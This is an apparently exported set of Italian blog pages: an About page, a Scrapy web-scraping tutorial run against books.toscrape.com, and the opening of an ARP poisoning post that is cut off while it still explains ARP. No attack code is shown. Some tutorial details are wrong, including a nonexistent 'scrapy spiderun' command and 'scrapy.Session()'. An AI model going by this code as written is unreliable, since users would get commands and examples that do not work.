[{"categories":null,"contents":"Mi chiamo Lombardi Angelo Nunzio, in arte, k0Br@3390 e questo √® SpaceHack, il mio blog. Su di esso troverai contenuti di informatica, programmazione e cyber security. Questo spazio serve a me come valvola di sfogo nel parlare a chi √® davvero interessato a questo mondo e a coloro che sono interessati davvero a questo mondo come il sottoscritto. Detto questo, happy coding e sopratutto, happy hacking üëΩ.\n[ Github ]\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/about/","tags":null,"title":"About"},{"categories":["Tutorial"],"contents":" Table Of Contents:\n Introduzione al modulo Esempi Pratici  Estrazione del titolo di una pagina web Estrazione dei prezzi dei libri da una pagina web Estrazione di tutte le informazioni sui libri da una pagina web Estrazione di tutte le informazioni sui libri da pi√π pagine web Estrazione di informazioni sui libri da una pagina web utilizzando un\u0026rsquo;espressione regolare Estrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV Scraping di dati da pi√π siti Scraping di dati da una pagina con autenticazione Scraping di dati da una pagina AJAX Scraping di dati da una pagina utilizzando una sessione Scraping di tutti i prezzi dei libri su tutte le pagine Scraping di tutti i titoli e le categorie dei libri Scraping delle immagini dei libri Scraping dei prezzi dei libri in un formato specifico (es. JSON)     Introduzione al modulo Scrapy √® un modulo Python open-source per il web scraping. √à stato progettato per estrarre i dati da siti web in modo efficiente e rapido. Scrapy offre una serie di funzionalit√† avanzate per il web scraping, tra cui la gestione delle richieste, la navigazione del sito, la selezione dei dati tramite XPath o CSS selector e la gestione dei cookie.\nIl modulo Scrapy utilizza una struttura ad albero per rappresentare il contenuto di una pagina web. Ci√≤ consente agli sviluppatori di selezionare facilmente i dati desiderati utilizzando i selettori CSS e XPath. Inoltre, Scrapy fornisce una serie di metodi per navigare il sito web come segue: seguire i link, inviare form e gestire i cookie.\nScrapy √® anche progettato per essere utilizzato in modo scalabile, √® in grado di gestire grandi quantit√† di dati e di supportare il parallelismo. Il modulo supporta anche la persistenza dei dati, consentendo di salvare i dati estratti in un formato specifico, come CSV, JSON o XML.\nPer creare un progetto con Scrapy, √® necessario creare un nuovo progetto utilizzando il comando scrapy startproject, quindi creare un nuovo spider utilizzando il comando scrapy genspider. In seguito si definiscono le regole di scraping nella funzione parse() del proprio spider.\nIn sintesi Scrapy √® uno strumento molto potente per estrarre i dati dal web, grazie alla sua flessibilit√† e alle sue funzionalit√† avanzate, √® possibile creare spider in grado di estrarre dati da siti web complessi e navigare attraverso pi√π pagine.\n Disclaimer: ‚ö†Ô∏è Il web scraping √® una pratica legale a meno che non violi le condizioni d\u0026rsquo;uso del sito web in questione. Il presente software √® stato creato per scopi educativi e di ricerca e non deve essere utilizzato per violare le leggi o i termini d\u0026rsquo;uso di un sito web. L\u0026rsquo;utente √® responsabile dell\u0026rsquo;utilizzo del software e degli eventuali danni causati dall\u0026rsquo;utilizzo improprio. ‚ö†Ô∏è\n Per installare e configurare uno progetto con il modulo scrapy possiamo usare i seguenti step:\nInstallare Scrapy: √® possibile farlo utilizzando il comando seguente nella riga di comando:\npip install scrapy Oppure per Python3:\npip3 install scrapy Creare un nuovo progetto: Per creare un progetto √® possibile utilizzare il comando nella riga di comando:\nscrapy startproject \u0026lt;nome_progetto\u0026gt; Dove \u0026lt;nome_progetto\u0026gt; √® il nome del progetto che si desidera creare. Questo comando creer√† una nuova cartella con il nome del progetto, che conterr√† i file di configurazione e la struttura del progetto.\nCreare un nuovo spider: utilizzare il comando seguente nella riga di comando:\nscrapy genspider \u0026lt;nome_spider\u0026gt; \u0026lt;dominio\u0026gt; Dove \u0026lt;nome_spider\u0026gt; √® il nome del spider che si desidera creare e  √® il dominio del sito web da cui si desidera estrarre i dati. Questo comando creer√† un nuovo file spider nella cartella \u0026ldquo;spiders\u0026rdquo; del progetto. Il comando richiede il nome dello spider e l\u0026rsquo;URL di partenza per lo spider. Esempio:\nscrapy genspider example example.com Questo creer√† un file chiamato example.py all\u0026rsquo;interno della cartella spiders del tuo progetto, con una classe di spider chiamata ExampleSpider che inizia a estrarre i dati dall\u0026rsquo;URL example.com.\nUna volta creato lo spider, √® possibile modificare il codice per soddisfare le esigenze del progetto. In seguito, lo spider pu√≤ essere eseguito utilizzando il comando:\nscrapy spiderun \u0026lt;nome_spider\u0026gt;.py Extra: ExampleSpider √® il nome della classe dello spider generato automaticamente dal comando scrapy genspider con il nome che gli hai dato quando hai creato lo spider.\nLa classe estende la classe base scrapy.Spider e include una serie di propriet√† e metodi predefiniti che puoi utilizzare per configurare e eseguire lo spider.\nPer esempio, nella classe √® presente il nome dello spider name e gli url di partenza start_urls che specificano l\u0026rsquo;indirizzo web a cui si vuole fare scraping, la funzione di callback parse() che viene chiamata quando lo spider recupera una pagina web.\nL\u0026rsquo;idea √® che tu possa modificare questa classe e adattarlo alle tue esigenze specifiche, aggiungendo eventuali selettori CSS o XPath, gestione dei cookies, trattamento dei dati, ecc.\nModificare il codice del spider: aprire il file spider appena creato e modificare il codice per adattarlo alle esigenze del progetto. √à possibile utilizzare il metodo start_requests() per specificare la URL iniziale da cui iniziare a estrarre i dati, il metodo parse() per specificare come estrarre i dati dalle pagine web, e il metodo parse_item() per specificare come estrarre i dati da un singolo elemento della pagina web.\nEseguire lo spider: Come citato in precedenza √® possibile utilizzare il comando seguente nella riga di comando per eseguire lo spider:\nscrapy spiderun \u0026lt;nome_spider\u0026gt;.py Dove \u0026lt;nome_spider\u0026gt; √® il nome del spider creato in precedenza. In questo modo, verranno stampati i dati estratti nella console o salvati in un file, a seconda delle impostazioni specificate nel codice. Per eseguire lo spider bisogna trovarsi nella directory spiders.\nRicordati che √® possibile utilizzare anche il comando\nscrapy shell \u0026lt;url\u0026gt; Questo per testare il codice del tuo spider su una singola pagina web, prima di lanciare la scansione sull\u0026rsquo;intero sito.\nDi seguito vediamo degli esempi usando come URL: http://books.toscrape.com/ che viene usato appositamente per il Web Scraping.\nNota: durante l‚Äôesecuzione del codice possono esserci errori per la mancanza del modulo attrs, per installarlo usiamo il comando:\npip install attrs Oppure per Python3:\npip3 install attrs Se abbiamo gi√† questo modulo, possiamo aggiornarlo con il comando:\npip install --upgrade attrs Esempi Pratici Estrazione del titolo di una pagina web import scrapy class TitleSpider(scrapy.Spider): name = \u0026#34;titlespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), } Questo codice crea uno spider chiamato TitleSpider che estende la classe base scrapy.Spider. Nella classe, viene definito un nome per lo spider e una lista di URL di partenza per lo spider. Nel nostro caso, l\u0026rsquo;URL di partenza √® una pagina web di un negozio di libri online.\nLa funzione parse() √® chiamata ogni volta che lo spider recupera una pagina web. All\u0026rsquo;interno della funzione parse(), utilizziamo un ciclo for per scorrere tutti gli elementi HTML che corrispondono al selettore article.product_pod. Questo selettore seleziona tutti gli elementi  con la classe product_pod nella pagina web.\nPer ogni elemento selezionato, utilizziamo il selettore h3 \u0026gt; a::text per selezionare il testo del primo elemento  all\u0026rsquo;interno dell\u0026rsquo;elemento  all\u0026rsquo;interno dell\u0026rsquo;elemento . Il testo selezionato rappresenta il titolo del libro. Utilizziamo la funzione get() per restituire il valore del titolo del libro come una stringa. Infine, utilizziamo yield per restituire un dizionario contenente il titolo del libro. Alla fine del ciclo for, lo spider avr√† raccolto tutti i titoli dei libri presenti nella pagina web di partenza.\nEstrazione dei prezzi dei libri da una pagina web import scrapy class PriceSpider(scrapy.Spider): name = \u0026#34;pricespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } Questo codice √® un esempio di uno spider di Scrapy che estrae i prezzi dei libri da una pagina web specifica.\nLa classe PriceSpider estende la classe base scrapy.Spider e include alcune propriet√† e metodi specifici per questo spider.\n La propriet√† name assegna un nome allo spider, in questo caso \u0026ldquo;pricespider‚Äù La propriet√† start_urls specifica gli URL di partenza per lo spider, in questo caso l\u0026rsquo;indirizzo \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026rdquo;  La funzione parse() √® il metodo di callback chiamato quando lo spider recupera una pagina web, questa funzione √® responsabile di estrarre i dati dalla pagina.\nLa funzione utilizza un ciclo for per ciclare attraverso ogni elemento HTML con classe article.product_pod, questi elementi rappresentano ogni libro presente sulla pagina.\nPer ogni libro, utilizza il selettore CSS .price_color per individuare il prezzo del libro, e utilizza il metodo get() per recuperare il testo del prezzo. Il prezzo estratto viene quindi aggiunto ad un dizionario come valore della chiave \u0026ldquo;price\u0026rdquo; e restituito attraverso l\u0026rsquo;istruzione yield.\nIn sintesi, questo spider recupera la pagina web specificata, estrae i prezzi di ogni libro presente sulla pagina e li restituisce come una serie di dizionari, dove ogni dizionario rappresenta un libro e contiene solo una chiave price con il relativo prezzo del libro.\nEstrazione di tutte le informazioni sui libri da una pagina web import scrapy class BookSpider(scrapy.Spider): name = \u0026#34;bookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } Questo codice mostra come creare uno spider chiamato \u0026ldquo;bookspider\u0026rdquo; utilizzando il modulo Scrapy in Python. Lo spider inizia a navigare nell\u0026rsquo;indirizzo web specificato in \u0026ldquo;start_urls\u0026rdquo;, che in questo caso √® \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa funzione parse() viene chiamata per ogni pagina visitata dallo spider e consente di analizzare il contenuto della pagina. In questo esempio, la funzione parse() utilizza il metodo \u0026ldquo;css\u0026rdquo; per selezionare tutti gli elementi HTML con la classe \u0026ldquo;product_pod\u0026rdquo; e li itera uno per uno.\nPer ogni elemento, vengono estratte tre informazioni:\n Il titolo del libro utilizzando il selettore \u0026ldquo;h3 \u0026gt; a::text\u0026rdquo;, che seleziona il testo all\u0026rsquo;interno del tag \u0026ldquo;a\u0026rdquo; immediatamente figlio del tag \u0026ldquo;h3\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article‚Äù Il prezzo utilizzando il selettore \u0026ldquo;.price_color::text\u0026rdquo;, che seleziona il testo all\u0026rsquo;interno del tag con classe \u0026ldquo;price_color\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article‚Äù La valutazione utilizzando il selettore \u0026ldquo;.star-rating::attr(class)\u0026rdquo;, che seleziona il valore dell\u0026rsquo;attributo \u0026ldquo;class\u0026rdquo; del tag con classe \u0026ldquo;star-rating\u0026rdquo; all\u0026rsquo;interno dell\u0026rsquo;elemento \u0026ldquo;article\u0026rdquo;. Poi si utilizza il metodo \u0026ldquo;split\u0026rdquo; per dividere la stringa in una lista di stringhe, e si prende l\u0026rsquo;ultima parte della stringa cio√® l\u0026rsquo;ultimo elemento della lista.  Tutte queste informazioni vengono quindi restituite come un dizionario utilizzando il comando \u0026ldquo;yield\u0026rdquo; all\u0026rsquo;interno del ciclo for.\nEstrazione di tutte le informazioni sui libri da pi√π pagine web import scrapy class MultiPageBookSpider(scrapy.Spider): name = \u0026#34;multipagebookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } next_page = response.css(\u0026#34;li.next \u0026gt; a::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.parse) Questo codice √® un esempio di uno spider Scrapy che utilizza un ciclo for per estrarre informazioni da pi√π pagine di un sito web.\nIl nome dello spider √® multipagebookspider e la pagina iniziale da cui inizia la scansione √® \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa funzione parse √® chiamata per ogni pagina e utilizza il metodo css per estrarre informazioni sui libri dalla pagina (titolo, prezzo e valutazione).\nSuccessivamente, utilizza il metodo css per estrarre il link alla prossima pagina e utilizza il metodo response.follow per seguire il link e chiamare nuovamente la funzione parse per la pagina successiva. Ci√≤ consente allo spider di continuare a estrarre informazioni dalle pagine successive finch√© non viene raggiunta la fine del sito.\nEstrazione di informazioni sui libri da una pagina web utilizzando un\u0026rsquo;espressione regolare import scrapy import re class RegexBookSpider(scrapy.Spider): name = \u0026#34;regexbookspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): title = book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get() price = book.css(\u0026#34;.price_color::text\u0026#34;).get() rating = book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get() availability = book.css(\u0026#34;p.availability::text\u0026#34;).get() match = re.search(r\u0026#39;\\d+\u0026#39;, availability) if match: stock = int(match.group(0)) yield { \u0026#34;title\u0026#34;: title, \u0026#34;price\u0026#34;: price, \u0026#34;rating\u0026#34;: rating, \u0026#34;stock\u0026#34;: stock } Questo √® un esempio di codice scritto in Python utilizzando la libreria Scrapy per creare un spider chiamato RegexBookSpider.\nIn particolare, questo spider √® impostato per iniziare la navigazione nella pagina \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e utilizza l\u0026rsquo;espressione regolare (regex) per estrarre informazioni sul numero di copie disponibili di ciascun libro.\nIl metodo parse √® chiamato per ogni pagina visitata dallo spider e utilizza il selettore CSS per selezionare i dati di interesse nella pagina. In questo caso, il spider estrae il titolo, il prezzo, la valutazione e la disponibilit√† di ogni libro. L\u0026rsquo;espressione regolare re.search(r'\\d+', availability) √® utilizzata per cercare una corrispondenza di un numero intero all\u0026rsquo;interno della stringa di disponibilit√†. Se una corrispondenza viene trovata, il numero di stock disponibili viene salvato in una variabile chiamata \u0026ldquo;stock\u0026rdquo;. Infine, le informazioni estratte vengono restituite come un dizionario.\nEstrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV import scrapy class BookSpiderCSV(scrapy.Spider): name = \u0026#34;bookspidercsv\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] custom_settings = { \u0026#34;FEED_FORMAT\u0026#34;: \u0026#34;csv\u0026#34;, \u0026#34;FEED_URI\u0026#34;: \u0026#34;books.csv\u0026#34;, } def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), \u0026#34;rating\u0026#34;: book.css(\u0026#34;.star-rating::attr(class)\u0026#34;).get().split(\u0026#34; \u0026#34;)[-1], } Questo codice √® un esempio di uno spider Scrapy che raccoglie informazioni sui libri presenti su un sito web di esempio \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e le salva in un file CSV. Il nome dello spider √® \u0026ldquo;bookspidercsv\u0026rdquo; e la classe principale √® BookSpiderCSV che estende la classe base scrapy.Spider.\nLa propriet√† start_urls specifica l\u0026rsquo;URL iniziale del sito web da cui lo spider inizier√† a raccogliere i dati.\nLa funzione parse viene eseguita per ogni pagina del sito web raccolta dallo spider. In questo caso, utilizza il metodo response.css per selezionare tutti gli elementi HTML con la classe product_pod dalla pagina, che rappresentano i libri. Per ogni libro, raccoglie il titolo, il prezzo e la valutazione utilizzando il metodo \u0026ldquo;css\u0026rdquo; e salva i dati raccolti in un dizionario.\nLa propriet√† custom_settings imposta il formato del file di output e il nome del file di output. In questo caso, il formato √® impostato su csv e il nome del file su books.csv.\nAlla fine, tutti i dati raccolti dalla funzione parse vengono scritti nel file CSV books.csv nella cartella radice del progetto.\nScraping di dati da pi√π siti import scrapy class MultiSiteBookSpider(scrapy.Spider): name = \u0026#34;multisitebookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, \u0026#34;http://books.toscrape.com/catalogue/category/books/science_23/index.html\u0026#34;] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza un elenco di URL di partenza start_urls che contiene pi√π di un sito web. Utilizzando un solo metodo parse() per estrarre i dati, lo spider esegue la scansione di entrambi i siti web specificati nel elenco e estrae i dati dei libri dalle pagine web.\nScraping di dati da una pagina con autenticazione import scrapy from scrapy.http import FormRequest class MySpider(scrapy.Spider): name = \u0026#34;myspider\u0026#34; start_urls = [ \u0026#34;https://mywebsite.com/login\u0026#34;, ] def parse(self, response): # estraiamo il token CSRF dalla pagina di login csrf_token = response.css(\u0026#34;input[name=\u0026#39;csrf_token\u0026#39;]::attr(value)\u0026#34;).get() # creiamo una richiesta di form con i dati di login e il token CSRF yield FormRequest.from_response(response, formdata={ \u0026#34;username\u0026#34;: \u0026#34;myusername\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;mypassword\u0026#34;, \u0026#34;csrf_token\u0026#34;: csrf_token }, callback=self.after_login) def after_login(self, response): # controlliamo se siamo stati autenticati con successo if \u0026#34;Incorrect username or password\u0026#34; in response.body: self.logger.error(\u0026#34;Login fallito\u0026#34;) return # se siamo stati autenticati con successo, possiamo iniziare a fare scraping for item in response.css(\u0026#34;div.item\u0026#34;): yield { \u0026#34;title\u0026#34;: item.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;price\u0026#34;: item.css(\u0026#34;span.price::text\u0026#34;).get(), \u0026#34;image_url\u0026#34;: item.css(\u0026#34;img::attr(src)\u0026#34;).get() } # e possiamo anche seguire i link per le pagine successive next_page = response.css(\u0026#34;a.next_page::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.after_login) In questo modo, il spider inizia visitando la pagina di login, estrae il token CSRF e invia una richiesta di form con i dati di login e il token. Quindi, utilizza la funzione after_login come callback per gestire la risposta della richiesta di form. In questa funzione, il spider controlla se l\u0026rsquo;autenticazione √® stata eseguita con successo e, in caso contrario, registra un errore. In caso contrario, il spider inizia a fare scraping dei dati e a seguire i link per le pagine successive.\nScraping di dati da una pagina AJAX import scrapy class AJAXBookSpider(scrapy.Spider): name = \u0026#34;ajaxbookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/ajax\u0026#34;] def parse(self, response): # Invia una richiesta POST per ottenere i dati dei libri tramite AJAX yield scrapy.FormRequest( \u0026#34;http://books.toscrape.com/catalogue/category/books/ajax\u0026#34;, formdata={\u0026#34;page\u0026#34;: \u0026#34;2\u0026#34;}, callback=self.parse_ajax_response ) def parse_ajax_response(self, response): # Estraiamo i dati dei libri dalla risposta AJAX for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza il metodo scrapy.FormRequest() per inviare una richiesta POST con i dati del form AJAX alla pagina web. La risposta AJAX contiene i dati dei libri che vengono estratti dalla pagina utilizzando il metodo parse_ajax_response().\nScraping di dati da una pagina utilizzando una sessione import scrapy class SessionBookSpider(scrapy.Spider): name = \u0026#34;sessionbookspider\u0026#34; start_urls = [\u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;] def start_requests(self): # Iniziamo una sessione self.session = scrapy.Session() # Effettuiamo il login return [self.session.post(\u0026#34;http://books.toscrape.com/login\u0026#34;, data={\u0026#34;username\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;pass\u0026#34;})] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 a::attr(title)\u0026#34;).get(), \u0026#34;price\u0026#34;: book.css(\u0026#34;p.price_color::text\u0026#34;).get() } In questo esempio, lo spider utilizza una sessione per effettuare il login alla pagina web prima di iniziare a estrarre i dati. Utilizzando il metodo start_requests() per effettuare il login e il metodo parse() per estrarre i dati, lo spider mantiene la sessione attiva durante tutto il processo di scraping.\nScraping di tutti i prezzi dei libri su tutte le pagine import scrapy class AllPricesSpider(scrapy.Spider): name = \u0026#34;allpricesspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } next_page = response.css(\u0026#34;li.next \u0026gt; a::attr(href)\u0026#34;).get() if next_page is not None: yield response.follow(next_page, self.parse) Questo codice √® un esempio di uno spider Scrapy che estrae i prezzi di tutti i libri presenti sul sito \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e li salva in un formato predefinito.\nIl codice importa la libreria di scrapy, quindi definisce una classe AllPricesSpider che estende la classe base scrapy.Spider.\nLa classe ha un nome univoco name e una lista di URL da cui iniziare a raccogliere i dati start_urls.\nIl metodo parse √® chiamato per ogni pagina visitata e utilizza la funzione response.css per selezionare tutti gli elementi article.product_pod sulla pagina. Per ogni elemento selezionato, estrae il prezzo utilizzando la selezione .price_color::text e lo salva in un dizionario.\nInfine, il codice cerca il link per la pagina successiva, se esiste, utilizzando la funzione \u0026ldquo;response.css(\u0026ldquo;li.next \u0026gt; a::attr(href)\u0026quot;).get()\u0026rdquo; e segue il link utilizzando la funzione \u0026ldquo;response.follow(next_page, self.parse)\u0026rdquo; per continuare a raccogliere dati dalle successive pagine.\nScraping di tutti i titoli e le categorie dei libri import scrapy class TitleCategorySpider(scrapy.Spider): name = \u0026#34;titlecategoryspider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;category\u0026#34;: response.css(\u0026#34;nav \u0026gt; ul \u0026gt; li.active \u0026gt; a::text\u0026#34;).get(), } Questo codice utilizza la libreria scrapy per estrarre dati da una pagina web. In particolare, il codice crea una classe chiamata TitleCategorySpider che estrae i titoli dei libri e la categoria dei libri dalla pagina web \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nLa classe TitleCategorySpider estende la classe scrapy.Spider e definisce un metodo parse che viene chiamato quando la pagina specificata in start_urls √® scaricata.\nIl metodo parse utilizza il metodo response.css per selezionare gli elementi delle pagine web. Utilizza il metodo css per selezionare gli elementi article.product_pod dalla pagina web. Per ogni elemento selezionato, utilizza il metodo css di nuovo per estrarre il titolo del libro (\u0026ldquo;h3 \u0026gt; a::text\u0026rdquo;) e la categoria del libro (\u0026ldquo;nav \u0026gt; ul \u0026gt; li.active \u0026gt; a::text\u0026rdquo;) e quindi li salva in un dizionario.\nIl metodo yield √® utilizzato per restituire il dizionario come risultato del metodo parse. In questo modo, scrapy sa che il risultato deve essere raccolto e utilizzato per qualcos\u0026rsquo;altro, come la scrittura su un file o la memorizzazione in un database.\nScraping delle immagini dei libri import scrapy class BookImageSpider(scrapy.Spider): name = \u0026#34;bookimagespider\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;title\u0026#34;: book.css(\u0026#34;h3 \u0026gt; a::text\u0026#34;).get(), \u0026#34;image_urls\u0026#34;: book.css(\u0026#34;img::attr(src)\u0026#34;).getall(), } Il codice utilizza la libreria scrapy per creare uno spider chiamato bookimagespider che inizia a navigare dalla pagina \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot;.\nIl metodo parse(self, response) viene chiamato per ogni pagina visitata dallo spider. Il metodo cerca tutti gli elementi HTML con classe product_pod che rappresentano i libri nella pagina. Per ogni elemento trovato, estrae il titolo del libro e l\u0026rsquo;URL dell\u0026rsquo;immagine del libro.\nL\u0026rsquo;URL dell\u0026rsquo;immagine del libro viene estratto tramite il metodo .css(\u0026ldquo;img::attr(src)\u0026quot;).getall() che seleziona tutti gli elementi img e estrae l\u0026rsquo;attributo src. Il risultato √® una lista di URL delle immagini dei libri.\nQuesti dati estratti vengono quindi restituiti come un dizionario con le chiavi title e image_urls.\nScraping dei prezzi dei libri in un formato specifico (es. JSON) import scrapy class PriceSpiderJSON(scrapy.Spider): name = \u0026#34;pricespiderjson\u0026#34; start_urls = [ \u0026#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026#34;, ] custom_settings = { \u0026#34;FEED_FORMAT\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;FEED_URI\u0026#34;: \u0026#34;prices.json\u0026#34;, } def parse(self, response): for book in response.css(\u0026#34;article.product_pod\u0026#34;): yield { \u0026#34;price\u0026#34;: book.css(\u0026#34;.price_color::text\u0026#34;).get(), } Questo codice utilizza la libreria scrapy per creare uno spider chiamato PriceSpiderJSON, che inizia a navigare nella pagina web \u0026ldquo;http://books.toscrape.com/catalogue/category/books/science_22/index.html\u0026quot; e recupera i prezzi dei libri presenti su quella pagina. Utilizza il metodo parse() per elaborare la risposta ottenuta dalla pagina web e recuperare i prezzi. Il metodo yield {} serve per generare un dizionario di output contenente la propriet√† \u0026ldquo;price\u0026rdquo; con il prezzo del libro.\nIl dizionario custom_settings definisce il formato del feed e il nome del file in cui verranno salvati i dati recuperati dallo spider. In questo caso il feed verr√† salvato in formato JSON con nome prices.json.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/basi-sul-modulo-scrapy/basi_sul_modulo_scrapy/","tags":["Web Scraping","Python","Spider"],"title":"Basi sul Modulo Scrapy"},{"categories":["Tutorial","Network Attacks"],"contents":"Table Of Contents:\n Cos\u0026rsquo;√® il Protocollo ARP Che cos‚Äô√® l‚ÄôARP Poisoning ARP Poisoning con Scapy e Python Come prevenire L\u0026rsquo;ARP Poisoning con DAI   In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l\u0026rsquo;ARP Poisoning.\nHo iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.\nCos\u0026rsquo;√® il Protocollo ARP Per approfondire l\u0026rsquo;argomento ti consigli di leggere questo.\nA differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per l‚Äôindirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dell‚Äôhardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si pu√≤ applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dell‚Äôindirizzo tramite ARP √® perci√≤ indispensabile.\nSe ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare l‚Äôindirizzo MAC appropriato. Cos√¨ entra in azione l‚ÄôAddress Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando l‚Äôindirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese ‚ÄúARP request‚Äù) a tutti i dispositivi in rete, questa richiesta comprende all‚Äôincirca le seguenti informazioni:\n Un computer con l\u0026rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l\u0026rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell\u0026rsquo;indirizzo MAC giusto.\n La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete √® collegato a una tabella locale, detta cache ARP, per evitare che prima dell‚Äôinvio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dell‚ÄôIP assegnato.\nTutti i computer nella rete annotano cos√¨ nella richiesta broadcast la coppia di indirizzo del mittente consegnato. Per√≤ ci si aspetta una risposta broadcast solo dal computer B, che invia un‚ÄôARP reply comprendente le seguenti informazioni:\n Qui il sistema con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz. L\u0026rsquo;indirizzo MAC ricercato √® aa-aa-aa-aa-aa-aa.\n Se 